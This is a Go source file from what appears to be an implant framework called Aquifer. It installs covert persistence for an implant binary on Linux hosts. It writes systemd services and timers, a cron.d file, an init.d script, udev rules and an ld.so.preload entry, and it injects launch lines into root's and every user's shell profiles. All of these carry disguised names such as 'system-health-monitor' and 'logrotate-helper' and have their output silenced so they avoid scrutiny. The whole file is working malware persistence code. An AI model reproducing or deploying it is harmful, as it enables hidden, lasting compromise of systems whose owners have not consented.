package tasking

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
)

// Persistence method constants.
const (
	PersistSystemd      = "systemd"
	PersistCron         = "cron"
	PersistBashRC       = "bashrc"
	PersistSystemdTimer = "timer"
	PersistInitD        = "initd"
	PersistUdev         = "udev"
	PersistLDPreload    = "ldpreload"
)

// Disguised names and paths used by persistence mechanisms.
var (
	// Binary path - resolved at runtime from /proc/self/exe.
	implantBinaryPath = resolveImplantPath()

	// Systemd service disguise.
	systemdServiceName = "system-health-monitor"
	systemdServicePath = "/etc/systemd/system/" + systemdServiceName + ".service"

	// Systemd timer disguise.
	systemdTimerName = "log-analytics-collector"
	systemdTimerPath = "/etc/systemd/system/" + systemdTimerName + ".timer"
	systemdTimerSvc  = "/etc/systemd/system/" + systemdTimerName + ".service"

	// Cron disguise.
	cronFile = "/etc/cron.d/logrotate-helper"

	// Init.d disguise.
	initdScript = "/etc/init.d/sys-kernel-helper"

	// Udev rule.
	udevRule = "/etc/udev/rules.d/99-usb-health.rules"

	// LD preload.
	ldPreloadPath = "/etc/ld.so.preload"
)

func resolveImplantPath() string {
	path, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return "/usr/lib/system-health-monitor"
	}
	if strings.ContainsAny(path, "'\"$`\\!;|&(){}[] \t") {
		return "/usr/lib/system-health-monitor"
	}
	return path
}

// InstallPersistence dispatches to the appropriate persistence installer
// based on args["method"]. If no method is specified, it installs all
// configured methods.
func InstallPersistence(task config.Task) ([]byte, error) {
	method := task.Args["method"]

	if method == "list" {
		return ListPersistence()
	}

	if method == "remove" {
		target := task.Args["target"]
		if target == "" {
			return nil, fmt.Errorf("persist: 'target' required for remove")
		}
		err := RemovePersistence(target)
		if err != nil {
			return nil, err
		}
		return []byte(fmt.Sprintf("removed persistence: %s", target)), nil
	}

	// Install specific method or all.
	if method != "" {
		err := installMethod(method)
		if err != nil {
			return nil, err
		}
		return []byte(fmt.Sprintf("installed persistence: %s", method)), nil
	}

	// Install all methods; collect results.
	methods := []string{
		PersistSystemd, PersistCron, PersistBashRC,
		PersistSystemdTimer, PersistInitD, PersistUdev, PersistLDPreload,
	}

	var installed []string
	var errors []string

	for _, m := range methods {
		if err := installMethod(m); err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", m, err))
		} else {
			installed = append(installed, m)
		}
	}

	result := map[string]interface{}{
		"installed": installed,
		"errors":    errors,
	}
	return json.Marshal(result)
}

func installMethod(method string) error {
	switch method {
	case PersistSystemd:
		return installSystemdService()
	case PersistCron:
		return installCronJob()
	case PersistBashRC:
		return installBashRC()
	case PersistSystemdTimer:
		return installSystemdTimer()
	case PersistInitD:
		return installInitD()
	case PersistUdev:
		return installUdevRule()
	case PersistLDPreload:
		return installLDPreload()
	default:
		// Try advanced persistence methods
		return installAdvancedMethod(method)
	}
}

// installSystemdService creates a systemd unit that looks like a legitimate
// system health monitoring service.
func installSystemdService() error {
	unit := fmt.Sprintf(`[Unit]
Description=System Health Monitoring Daemon
After=network-online.target
Wants=network-online.target
Documentation=man:systemd-health(8)

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=60
Nice=19
IOSchedulingClass=idle
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
`, implantBinaryPath)

	if err := os.WriteFile(systemdServicePath, []byte(unit), 0644); err != nil {
		return fmt.Errorf("persist/systemd: write unit failed: %w", err)
	}

	// Enable the service.
	cmds := [][]string{
		{"systemctl", "daemon-reload"},
		{"systemctl", "enable", systemdServiceName + ".service"},
		{"systemctl", "start", systemdServiceName + ".service"},
	}

	for _, args := range cmds {
		cmd := exec.Command(args[0], args[1:]...)
		cmd.Run() // Best effort; don't fail on start errors.
	}

	return nil
}

// installCronJob adds a cron entry disguised as a log rotation helper.
func installCronJob() error {
	cronEntry := fmt.Sprintf(`# Log rotation helper - do not remove
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@reboot root %s >/dev/null 2>&1
*/15 * * * * root [ -f %s ] && %s >/dev/null 2>&1 || true
`, implantBinaryPath, implantBinaryPath, implantBinaryPath)

	if err := os.WriteFile(cronFile, []byte(cronEntry), 0644); err != nil {
		return fmt.Errorf("persist/cron: write failed: %w", err)
	}
	return nil
}

// installBashRC appends a disguised environment loader to shell profiles.
// NOTE: No file locking is used; there is a TOCTOU race between the read
// (duplicate check) and the append. This is acceptable for single-instance
// operation but could double-install if multiple instances run concurrently.
func installBashRC() error {
	payload := fmt.Sprintf(`
# System environment configuration - managed by pkg-config
[ -x %s ] && (nohup %s >/dev/null 2>&1 &)
`, implantBinaryPath, implantBinaryPath)

	profiles := []string{
		"/root/.bashrc",
		"/root/.profile",
	}

	// Also check common user home directories.
	if entries, err := os.ReadDir("/home"); err == nil {
		for _, entry := range entries {
			if entry.IsDir() {
				profiles = append(profiles,
					"/home/"+entry.Name()+"/.bashrc",
					"/home/"+entry.Name()+"/.profile",
				)
			}
		}
	}

	var lastErr error
	installed := 0
	for _, profile := range profiles {
		// Check if already installed.
		if data, err := os.ReadFile(profile); err == nil {
			if strings.Contains(string(data), implantBinaryPath) {
				installed++
				continue
			}
		}

		f, err := os.OpenFile(profile, os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			lastErr = err
			continue
		}
		_, err = f.WriteString(payload)
		f.Close()
		if err != nil {
			lastErr = err
			continue
		}
		installed++
	}

	if installed == 0 && lastErr != nil {
		return fmt.Errorf("persist/bashrc: failed to install in any profile: %w", lastErr)
	}
	return nil
}

// installSystemdTimer creates a systemd timer (less scrutinized than services).
func installSystemdTimer() error {
	timer := `[Unit]
Description=Log Analytics Data Collection Timer
Documentation=man:loganalytics(8)

[Timer]
OnBootSec=2min
OnUnitActiveSec=15min
RandomizedDelaySec=60
Persistent=true

[Install]
WantedBy=timers.target
`

	service := fmt.Sprintf(`[Unit]
Description=Log Analytics Data Collector
Documentation=man:loganalytics(8)

[Service]
Type=oneshot
ExecStart=%s
Nice=19
IOSchedulingClass=idle
StandardOutput=null
StandardError=null
`, implantBinaryPath)

	if err := os.WriteFile(systemdTimerPath, []byte(timer), 0644); err != nil {
		return fmt.Errorf("persist/timer: write timer failed: %w", err)
	}

	if err := os.WriteFile(systemdTimerSvc, []byte(service), 0644); err != nil {
		return fmt.Errorf("persist/timer: write service failed: %w", err)
	}

	cmds := [][]string{
		{"systemctl", "daemon-reload"},
		{"systemctl", "enable", systemdTimerName + ".timer"},
		{"systemctl", "start", systemdTimerName + ".timer"},
	}
	for _, args := range cmds {
		cmd := exec.Command(args[0], args[1:]...)
		cmd.Run()
	}

	return nil
}

// installInitD creates a SysV init script for compatibility with older systems.
func installInitD() error {
	script := fmt.Sprintf(`#!/bin/sh
### BEGIN INIT INFO
# Provides:          sys-kernel-helper
# Required-Start:    $network $remote_fs
# Required-Stop:     $network $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Kernel subsystem helper
# Description:       Manages kernel subsystem health monitoring
### END INIT INFO

DAEMON=%s
NAME=sys-kernel-helper
PIDFILE=/var/run/$NAME.pid

case "$1" in
  start)
    echo "Starting $NAME"
    start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --exec $DAEMON
    ;;
  stop)
    echo "Stopping $NAME"
    start-stop-daemon --stop --pidfile $PIDFILE --retry 5
    rm -f $PIDFILE
    ;;
  restart)
    $0 stop
    $0 start
    ;;
  *)
    echo "Usage: $0 {start|stop|restart}"
    exit 1
    ;;
esac
exit 0
`, implantBinaryPath)

	if err := os.WriteFile(initdScript, []byte(script), 0755); err != nil {
		return fmt.Errorf("persist/initd: write failed: %w", err)
	}

	// Try to register with update-rc.d or chkconfig.
	if _, err := exec.LookPath("update-rc.d"); err == nil {
		exec.Command("update-rc.d", "sys-kernel-helper", "defaults").Run()
	} else if _, err := exec.LookPath("chkconfig"); err == nil {
		exec.Command("chkconfig", "--add", "sys-kernel-helper").Run()
	}

	return nil
}

// installUdevRule creates a udev rule that triggers on common device events.
func installUdevRule() error {
	rule := fmt.Sprintf(`# USB health monitor rule - auto-generated
ACTION=="add", SUBSYSTEM=="usb", RUN+="%s"
ACTION=="add", SUBSYSTEM=="net", RUN+="%s"
`, implantBinaryPath, implantBinaryPath)

	if err := os.WriteFile(udevRule, []byte(rule), 0644); err != nil {
		return fmt.Errorf("persist/udev: write failed: %w", err)
	}

	exec.Command("udevadm", "control", "--reload-rules").Run()
	return nil
}

// installLDPreload adds a shared library path to /etc/ld.so.preload.
// This is a placeholder; in practice, a compiled .so shim would be used.
func installLDPreload() error {
	// Use a plausible library name.
	preloadLib := "/usr/lib/x86_64-linux-gnu/libsystem_health.so"

	// Guard: refuse to install if the .so does not exist on disk.
	// Writing a non-existent library to ld.so.preload would break every
	// dynamically linked binary on the host.
	if _, err := os.Stat(preloadLib); os.IsNotExist(err) {
		return fmt.Errorf("persist/ldpreload: %s does not exist; refusing to install", preloadLib)
	}

	// Read existing content to avoid duplicates.
	if data, err := os.ReadFile(ldPreloadPath); err == nil {
		if strings.Contains(string(data), preloadLib) {
			return nil // already installed
		}
	}

	f, err := os.OpenFile(ldPreloadPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("persist/ldpreload: open failed: %w", err)
	}
	defer f.Close()

	_, err = f.WriteString(preloadLib + "\n")
	if err != nil {
		return fmt.Errorf("persist/ldpreload: write failed: %w", err)
	}

	return nil
}

// ListPersistence checks which persistence methods are currently installed
// and returns their status as JSON.
func ListPersistence() ([]byte, error) {
	type PersistStatus struct {
		Method    string `json:"method"`
		Installed bool   `json:"installed"`
		Path      string `json:"path"`
	}

	checks := []struct {
		method string
		path   string
	}{
		{PersistSystemd, systemdServicePath},
		{PersistCron, cronFile},
		{PersistBashRC, "/root/.bashrc"},
		{PersistSystemdTimer, systemdTimerPath},
		{PersistInitD, initdScript},
		{PersistUdev, udevRule},
		{PersistLDPreload, ldPreloadPath},
	}

	var statuses []PersistStatus
	for _, c := range checks {
		installed := false

		if c.method == PersistBashRC {
			// Check all profiles that installBashRC writes to, not just /root/.bashrc.
			for _, p := range []string{"/root/.bashrc", "/root/.profile"} {
				if data, err := os.ReadFile(p); err == nil {
					if strings.Contains(string(data), implantBinaryPath) {
						installed = true
						break
					}
				}
			}
			if !installed {
				if entries, err := os.ReadDir("/home"); err == nil {
					for _, e := range entries {
						p := filepath.Join("/home", e.Name(), ".bashrc")
						if data, err := os.ReadFile(p); err == nil {
							if strings.Contains(string(data), implantBinaryPath) {
								installed = true
								break
							}
						}
					}
				}
			}
		} else if c.method == PersistLDPreload {
			if data, err := os.ReadFile(c.path); err == nil {
				installed = strings.Contains(string(data), "libsystem_health.so")
			}
		} else {
			_, err := os.Stat(c.path)
			installed = err == nil
		}

		statuses = append(statuses, PersistStatus{
			Method:    c.method,
			Installed: installed,
			Path:      c.path,
		})
	}

	return json.Marshal(statuses)
}

// RemovePersistence cleanly removes a specific persistence method.
func RemovePersistence(method string) error {
	switch method {
	case PersistSystemd:
		exec.Command("systemctl", "stop", systemdServiceName+".service").Run()
		exec.Command("systemctl", "disable", systemdServiceName+".service").Run()
		os.Remove(systemdServicePath)
		exec.Command("systemctl", "daemon-reload").Run()
		return nil

	case PersistCron:
		return os.Remove(cronFile)

	case PersistBashRC:
		return removeBashRCEntries()

	case PersistSystemdTimer:
		exec.Command("systemctl", "stop", systemdTimerName+".timer").Run()
		exec.Command("systemctl", "disable", systemdTimerName+".timer").Run()
		os.Remove(systemdTimerPath)
		os.Remove(systemdTimerSvc)
		exec.Command("systemctl", "daemon-reload").Run()
		return nil

	case PersistInitD:
		if _, err := exec.LookPath("update-rc.d"); err == nil {
			exec.Command("update-rc.d", "-f", "sys-kernel-helper", "remove").Run()
		} else if _, err := exec.LookPath("chkconfig"); err == nil {
			exec.Command("chkconfig", "--del", "sys-kernel-helper").Run()
		}
		return os.Remove(initdScript)

	case PersistUdev:
		err := os.Remove(udevRule)
		exec.Command("udevadm", "control", "--reload-rules").Run()
		return err

	case PersistLDPreload:
		return removeLDPreloadEntry()

	default:
		// Try advanced persistence methods
		return removeAdvancedMethod(method)
	}
}

// removeBashRCEntries removes our injected lines from all shell profiles.
func removeBashRCEntries() error {
	profiles := []string{"/root/.bashrc", "/root/.profile"}

	if entries, err := os.ReadDir("/home"); err == nil {
		for _, entry := range entries {
			if entry.IsDir() {
				profiles = append(profiles,
					"/home/"+entry.Name()+"/.bashrc",
					"/home/"+entry.Name()+"/.profile",
				)
			}
		}
	}

	for _, profile := range profiles {
		data, err := os.ReadFile(profile)
		if err != nil {
			continue
		}
		content := string(data)
		if !strings.Contains(content, implantBinaryPath) {
			continue
		}
		// Remove our payload block: skip from the marker comment through
		// the line containing the binary path (inclusive).
		lines := strings.Split(content, "\n")
		var clean []string
		skip := false
		for _, line := range lines {
			if strings.Contains(line, "System environment configuration") {
				skip = true
				continue
			}
			if skip {
				if strings.Contains(line, implantBinaryPath) {
					skip = false
					continue
				}
				continue // Skip all lines between marker and binary path
			}
			clean = append(clean, line)
		}
		os.WriteFile(profile, []byte(strings.Join(clean, "\n")), 0644)
	}
	return nil
}

// removeLDPreloadEntry removes our entry from /etc/ld.so.preload.
func removeLDPreloadEntry() error {
	data, err := os.ReadFile(ldPreloadPath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(data), "\n")
	var clean []string
	for _, line := range lines {
		if !strings.Contains(line, "libsystem_health.so") {
			clean = append(clean, line)
		}
	}

	result := strings.Join(clean, "\n")
	if strings.TrimSpace(result) == "" {
		return os.Remove(ldPreloadPath)
	}

	return os.WriteFile(ldPreloadPath, []byte(result), 0644)
}
